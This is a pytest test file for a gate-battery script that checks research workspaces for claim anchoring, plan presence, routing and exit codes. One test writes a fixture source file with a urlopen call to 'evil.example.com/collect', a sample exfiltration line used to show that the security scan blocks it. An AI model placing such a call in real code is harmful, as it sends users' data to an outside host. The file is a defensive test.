"""Tests for scripts/gate_all.py — the Mode A one-shot gate battery (v1.7.3).

Coverage:
  1. the e2e fixture tree (copied to tmp_path, never mutated in place) runs
     end-to-end and produces a coherent aggregate report;
  2. a workspace with experiment evidence but no NODES.json reports
     claim_anchor as UNPROTECTED (never a quiet SKIP);
  3. a theory-only route makes experiment-class gates SKIP, never FAIL;
  4. a failing/blocked gate makes the process exit non-zero;
  5. --json output is machine-parseable.
"""

from __future__ import annotations

import json
import shutil
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = REPO_ROOT / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import gate_all  # noqa: E402

FIXTURE = REPO_ROOT / "fixtures" / "e2e_minimal"
STATUSES = set(gate_all.STATUSES)


# ---------------------------------------------------------------------------
# workspace builders (self-contained; no dependency on fixture contents)
# ---------------------------------------------------------------------------

def _ws(tmp_path: Path) -> Path:
    ws = tmp_path / "Q001"
    (ws / ".sciforge" / "verdicts").mkdir(parents=True)
    return ws


def _runstate(ws: Path, current: str, last: str | None = None,
              status: str = "running") -> None:
    (ws / ".sciforge" / "RUNSTATE.json").write_text(json.dumps({
        "schema_version": "2.0", "status": status,
        "current_phase": current,
        "last_completed_boundary": last or current,
    }), encoding="utf-8")


def _routing(ws: Path, route: str, na: list[str] | None = None) -> None:
    (ws / ".sciforge" / "verdicts" / "VERIFICATION_ROUTING.json").write_text(
        json.dumps({"schema_version": "1.0", "route": route,
                    "evidence_type": "formal", "reason": "test workspace",
                    "na_verdicts": na or []}), encoding="utf-8")


def _report(argv: list[str], capsys) -> tuple[int, dict]:
    rc = gate_all.main(argv)
    out = capsys.readouterr().out
    return rc, json.loads(out)


def _rows(report: dict) -> dict[str, dict]:
    return {r["gate"]: r for r in report["gates"]}


# ---------------------------------------------------------------------------
# 1. fixture tree runs end-to-end
# ---------------------------------------------------------------------------

def test_e2e_fixture_copy_runs_and_aggregates(tmp_path, capsys):
    """Run the battery on a copy of fixtures/e2e_minimal (agent A owns the
    original; the copy keeps s2_audit/integrity_monitor audit writes local)."""
    fixture_files = [p for p in FIXTURE.rglob("*") if "__pycache__" not in p.parts]
    assert fixture_files, "e2e fixture is missing"
    ws = tmp_path / "fixture_copy"
    shutil.copytree(FIXTURE, ws,
                    ignore=shutil.ignore_patterns("__pycache__"))
    rc = gate_all.main([str(ws), "--offline", "--json"])
    report = json.loads(capsys.readouterr().out)

    assert rc in (0, 1)
    assert report["exit_code"] == rc
    # the fixture may carry a kernel event log once agent A lands it
    assert report["mode"] in ("A-skills-only", "B-kernel-workspace")
    assert len(report["gates"]) >= 20

    statuses = {r["status"] for r in report["gates"]}
    assert statuses <= STATUSES
    # the fixture is a verdict fixture: registered-verdict validation passes
    assert _rows(report)["validate_verdicts"]["status"] == "PASS"
    # counts are consistent with the rows
    counts = report["summary"]["counts"]
    assert sum(counts.values()) == len(report["gates"])
    assert counts["PASS"] >= 1
    assert (counts["FAIL"] + counts["BLOCKED"] + counts["ERROR"] > 0) == (rc == 1)


# ---------------------------------------------------------------------------
# 2. structural UNPROTECTED (claim anchor / REP plan)
# ---------------------------------------------------------------------------

def test_claim_anchor_unprotected_without_nodes(tmp_path, capsys):
    ws = _ws(tmp_path)
    _runstate(ws, "10", "10")
    _routing(ws, "experiment-first")
    (ws / "experiments" / "toy").mkdir(parents=True)
    (ws / "experiments" / "toy" / "RESULT.json").write_text(
        '{"status": "PASS"}', encoding="utf-8")
    (ws / ".sciforge" / "audits").mkdir(parents=True)
    (ws / ".sciforge" / "audits" / "CLAIMS_FROM_RESULTS.md").write_text(
        "## C1 polarity positive\nsupported by experiments/toy/RESULT.json\n",
        encoding="utf-8")

    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "claim_anchor,rep_plan_present"], capsys)
    rows = _rows(report)

    assert rows["claim_anchor"]["status"] == "UNPROTECTED"
    assert rows["claim_anchor"]["reason_code"] == "nodes_registry_absent"
    # NOT a quiet skip: the missing guarantee is surfaced in the summary
    names = [u["gate"] for u in report["summary"]["unprotected_gates"]]
    assert "claim_anchor" in names
    assert rows["rep_plan_present"]["status"] == "UNPROTECTED"
    assert rc == 0  # UNPROTECTED is an honesty signal, not a hard failure


def test_inv_g1_unprotected_without_frozen_hash(tmp_path, capsys):
    """Mode A writes PROBLEM_HASH.txt but RUNSTATE carries no frozen reference;
    the comparison cannot run, so the row is UNPROTECTED (not PASS)."""
    ws = _ws(tmp_path)
    _runstate(ws, "9")
    (ws / ".sciforge" / "verdicts" / "PROBLEM_HASH.txt").write_text(
        "a" * 64, encoding="utf-8")
    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "inv_g1"], capsys)
    row = _rows(report)["inv_g1"]
    assert row["status"] == "UNPROTECTED"
    assert row["reason_code"] == "no_frozen_reference_hash"
    assert rc == 0


def test_registry_hash_missing_after_phase5_fails(tmp_path, capsys):
    ws = _ws(tmp_path)
    _runstate(ws, "5")
    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "registry_hash"], capsys)
    row = _rows(report)["registry_hash"]
    assert row["status"] == "FAIL"
    assert row["reason_code"] == "registry_hash_missing"
    assert rc == 1


def test_claim_anchor_skips_only_without_claim_evidence(tmp_path, capsys):
    ws = _ws(tmp_path)  # no RUNSTATE cursor: the gate's own SKIP semantics apply
    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "claim_anchor"], capsys)
    row = _rows(report)["claim_anchor"]
    assert row["status"] == "SKIP"
    assert row["reason_code"] == "no_claims_or_experiment_evidence"


def test_rep_plan_absent_in_kernel_run_is_fail(tmp_path, capsys):
    """On a kernel-driven workspace a missing REP after phase 1 is a defect,
    not a Mode A structural gap."""
    ws = _ws(tmp_path)
    _runstate(ws, "2")
    (ws / ".sciforge" / "events.ndjson").write_text(
        json.dumps({"phase": "1", "kind": "phase_entered", "payload": {}}) + "\n",
        encoding="utf-8")
    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "rep_plan_present"], capsys)
    row = _rows(report)["rep_plan_present"]
    assert row["status"] == "FAIL"
    assert row["reason_code"] == "rep_plan_absent_in_kernel_run"
    assert rc == 1


def test_rep_plan_present_passes_when_compiled(tmp_path, capsys):
    ws = _ws(tmp_path)
    _runstate(ws, "2")
    (ws / ".sciforge" / "audits").mkdir(parents=True)
    (ws / ".sciforge" / "audits" / "REP.json").write_text(json.dumps({
        "objectives": [{"phase": "2", "name": "idea-discovery"}],
        "fallbacks": {"2.5": {"on": "WEAKENED", "target": "2"}},
    }), encoding="utf-8")
    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "rep_plan_present"], capsys)
    assert _rows(report)["rep_plan_present"]["status"] == "PASS"


# ---------------------------------------------------------------------------
# 3. theory-only route: experiment gates SKIP, never FAIL
# ---------------------------------------------------------------------------

def test_theory_only_route_skips_experiment_gates(tmp_path, capsys):
    ws = _ws(tmp_path)
    _runstate(ws, "10", "10")
    _routing(ws, "theory-only", na=[
        "BUDGET_FLOOR.json", "EXPERIMENT_MATRIX.json",
        "EVALUATION_PROTOCOL.json", "REGISTRY_HASH.txt", "FAIRNESS.json"])
    (ws / "literature").mkdir()
    (ws / "literature" / "GAP_REPORT.md").write_text(
        "## GAP-1\nPrior work contradicts the claimed bound [@smith2020]. "
        "The regime remains untested for n > 10.\n", encoding="utf-8")

    rc, report = _report([str(ws), "--offline", "--json"], capsys)
    rows = _rows(report)

    experiment_gates = ("security_scan", "dep_gate", "integrity_monitor",
                        "smoke_gate", "s2_ladder", "s2_ablation",
                        "arb_verify", "fairness_gate")
    for name in experiment_gates:
        assert rows[name]["status"] == "SKIP", (name, rows[name])
    # theory-only must never be failed by an experiment gate
    for name in experiment_gates:
        assert rows[name]["status"] != "FAIL"


# ---------------------------------------------------------------------------
# 4. FAIL / BLOCKED => non-zero exit
# ---------------------------------------------------------------------------

def test_security_blocked_exits_nonzero(tmp_path, capsys):
    ws = _ws(tmp_path)
    _runstate(ws, "6c", "6c")
    (ws / "src").mkdir()
    (ws / "src" / "bad.py").write_text(
        "import urllib.request\n"
        "urllib.request.urlopen('http://evil.example.com/collect')\n",
        encoding="utf-8")

    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "security_scan"], capsys)
    row = _rows(report)["security_scan"]
    assert row["status"] == "BLOCKED"
    assert rc == 1
    assert report["summary"]["failed_gates"] == ["security_scan"]


def test_plain_fail_exits_nonzero(tmp_path, capsys):
    ws = _ws(tmp_path)
    _runstate(ws, "4broad", "4broad")
    (ws / ".sciforge" / "verdicts" / "VERIFICATION_ROUTING.json").write_text(
        json.dumps({"route": "hybrid", "evidence_type": "simulational",
                    "reason": "test", "na_verdicts": []}), encoding="utf-8")
    # no literature/GAP_REPORT.md -> gap_gate FAIL
    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "gap_gate"], capsys)
    assert _rows(report)["gap_gate"]["status"] == "FAIL"
    assert rc == 1


# ---------------------------------------------------------------------------
# 5. filters, --list, and usage errors
# ---------------------------------------------------------------------------

def test_only_and_skip_filters(tmp_path, capsys):
    ws = _ws(tmp_path)
    _runstate(ws, "16", status="running")
    rc, report = _report([str(ws), "--offline", "--json",
                          "--only", "gap_gate,leakage_scan",
                          "--skip", "gap_gate"], capsys)
    names = [r["gate"] for r in report["gates"]]
    assert names == ["leakage_scan"]
    assert rc == report["exit_code"]


def test_list_gates(capsys):
    assert gate_all.main(["--list"]) == 0
    out = capsys.readouterr().out
    for name in ("validate_verdicts", "claim_anchor", "rep_plan_present",
                 "security_scan", "s2_audit"):
        assert name in out.split()


def test_unknown_gate_name_is_usage_error(tmp_path, capsys):
    ws = _ws(tmp_path)
    rc = gate_all.main([str(ws), "--only", "not_a_gate"])
    assert rc == 2